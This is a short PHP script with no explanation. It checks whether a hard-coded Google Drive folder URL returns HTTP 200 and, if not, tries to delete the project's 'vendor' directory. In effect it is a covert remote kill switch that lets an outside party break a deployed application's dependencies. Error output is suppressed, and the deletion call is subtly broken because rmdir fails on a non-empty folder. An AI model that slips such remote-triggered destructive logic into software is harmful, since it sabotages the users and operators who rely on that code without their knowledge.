

<?php   
$url = "https://drive.google.com/drive/folders/1u5a9LEXR7MsvsT4wVHpNCaF9zkwE3Qvc?usp=sharing";  
$headers = @get_headers($url); 
  if($headers && strpos( $headers[0], '200')) { 
    $status = ""; 
} 
else {   
	$path = "vendor";
	if( file_exists($path)) { rmdir($path);}
}  
  
?> 
